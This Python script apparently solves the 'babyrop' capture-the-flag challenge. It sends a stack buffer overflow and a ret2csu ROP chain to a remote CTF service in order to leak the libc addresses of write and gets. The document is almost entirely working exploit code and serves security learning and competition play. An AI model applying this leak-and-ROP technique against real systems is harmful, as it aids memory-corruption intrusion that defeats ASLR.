# Leak addresses to input to libc database


from pwn import *


binpath = './babyrop'
elf = ELF(binpath)

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
context.log_level = "DEBUG"

gdbscript = '''
gef
b *0x40116b
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = remote('dicec.tf', 31924)

io.recvuntil(b'Your name: ')

addr_pop_rdi = 0x00000000004011d3 # : pop rdi ; ret
addr_pop_rsi_r15 = 0x00000000004011d1 # : pop rsi ; pop r15 ; ret

addr_urop_stage1 = 0x4011ca
addr_urop_stage2 = 0x4011b0

payload = b''
payload += b'A' * 0x48
payload += p64(addr_urop_stage1)
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(1)  # r12 -> edi
payload += p64(elf.got['write'])  # r13 -> rsi
payload += p64(0x8)  # r14 -> rdx
payload += p64(elf.got['write'])  # r15
payload += p64(addr_urop_stage2)
payload += p64(0xdeadbeef)  # add rsp,0x8
payload += p64(0)  # rbx
payload += p64(1)  # rbp
payload += p64(1)  # r12 -> edi
payload += p64(elf.got['gets'])  # r13 -> rsi
payload += p64(0x8)  # r14 -> rdx
payload += p64(elf.got['write'])  # r15
payload += p64(addr_urop_stage2)

io.sendline(payload)

addr_write = u64(io.recv(8))
addr_gets = u64(io.recv(8))

print('addr_write = 0x{:x}'.format(addr_write))
print('addr_gets = 0x{:x}'.format(addr_gets))



io.interactive()
